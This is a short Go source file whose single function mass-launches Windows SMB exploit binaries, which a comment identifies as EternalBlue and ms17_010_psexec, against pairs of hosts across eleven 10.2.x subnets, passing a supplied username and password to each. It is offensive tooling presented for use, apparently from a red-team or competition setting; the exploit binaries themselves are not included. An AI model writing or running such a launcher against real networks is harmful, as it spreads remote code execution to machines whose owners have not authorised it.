package main

import (
	"fmt"
	"os/exec"
)

func pysexec(username, password string) {

	binaries := []string {
		// _1 binaries are eternalblue. The rest are ms17_010_psexec
		"./pysexec_32",
		"./pysexec_64",
	}

	for i := 0	; i <= 10; i++ {
		ip1 := fmt.Sprintf("10.2.%v.10", i)
		ip2 := fmt.Sprintf("10.2.%v.12", i)
		for _, binary := range(binaries) {
			exec.Command(binary, ip1, username, password).Start()
			exec.Command(binary, ip2, username, password).Start()
		}
	}
}